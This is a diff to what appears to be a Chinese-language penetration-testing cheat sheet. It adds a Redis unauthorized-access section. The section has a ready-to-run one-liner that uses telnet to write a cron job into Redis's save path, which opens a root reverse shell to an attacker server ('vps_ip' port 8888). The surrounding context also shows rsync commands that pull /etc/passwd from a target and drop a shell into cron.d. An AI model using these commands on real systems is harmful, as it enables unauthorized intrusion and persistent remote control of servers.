@@ -56,6 +56,7 @@ web常见漏洞：
 			* [Apache_HTTPD_换行解析漏洞](#Apache_HTTPD_换行解析漏洞)
 			* [Apache_SSI_远程命令执行漏洞](#Apache_SSI_远程命令执行漏洞)
 		* [rsync_未授权访问漏洞](#rsync_未授权访问漏洞)
+		* [redis_未授权访问漏洞](#redis_未授权访问漏洞)
 		* [CRLF_HTTP头注人](#CRLF_HTTP头注人)
 		* [HPP_参数污染漏洞](#HPP_参数污染漏洞)
 		* [反序列化漏洞](#反序列化漏洞)
@@ -703,6 +704,11 @@ rsync -av rsync://tarket-ip:873/path/etc/passwd ./
 上传任意文件：
 rsync -av shell rsync://tarket-ip:873/path/etc/cron.d/shell
 ```
+### redis_未授权访问漏洞
+一行命令计划任务反弹shell：
+(sleep 1;echo "info";sleep 2;echo "set x \"\n* * * * * bash -i >& /dev/tcp/vps_ip/8888 0>&1\n\"";sleep 1;echo "config get dir";sleep 2;echo "config get dbfilename";sleep 2;echo "config set dir /var/spool/cron";sleep 1;echo "config set dbfilename root";sleep 1;echo "save";sleep 1;echo "exit")|telnet target 6379
+
+
 ### CRLF_HTTP头注人
 > **多出现于302跳转类型,观察url或参数是否存在于返回包中**
 ```
